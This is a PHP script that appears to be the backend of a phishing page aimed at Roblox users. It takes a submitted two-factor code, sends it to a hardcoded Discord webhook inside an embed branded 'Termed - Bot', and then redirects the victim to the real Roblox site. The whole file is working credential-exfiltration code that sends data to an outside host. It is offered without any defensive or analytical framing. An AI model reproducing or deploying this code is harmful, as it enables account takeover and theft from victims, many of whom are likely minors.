

<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  $ip = $_SERVER["REMOTE_ADDR"];
  $code = $_POST["step"]; }

$url = "https://discordapp.com/api/webhooks/1161346393005371473/i0cnlUE8Zjl_po_EYIvfa8cr_TNh0pS730lza2boqUK-cIze_0xMqZspcsod4dCB1Mnv";
$headers = [ "Content-Type: application/json; charset=utf-8" ];
$POST = [
    "username" => "Termed - Bot",
    "avatar_url" => "https://media.discordapp.net/attachments/1101251377944084492/1103007645075521637/letter-t-_1.png?width=586&height=586",
     "content" => "",
        "embeds" => [
            [
                "title" => "**2fa - Result**",
                "type" => "",
                "color" => hexdec("00000"),
                "author" => [
                     "name" => "2fa code!",
                ],
                "footer" => [
                    "text" => "🔓 2fa | Powered by Termed",
                  "icon_url" => "https://media.discordapp.net/attachments/1101251377944084492/1103007645075521637/letter-t-_1.png?width=586&height=586",
                ],
                "fields" => [
                    [
                        "name" => "**🔐 2step code**",
                        "value" => "```$code```",
                        "inline" => True
                    ],

                ]
            ],
        ],
    
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
    $response   = curl_exec($ch);
header("Location: https://web.roblox.com/");
exit();
?>
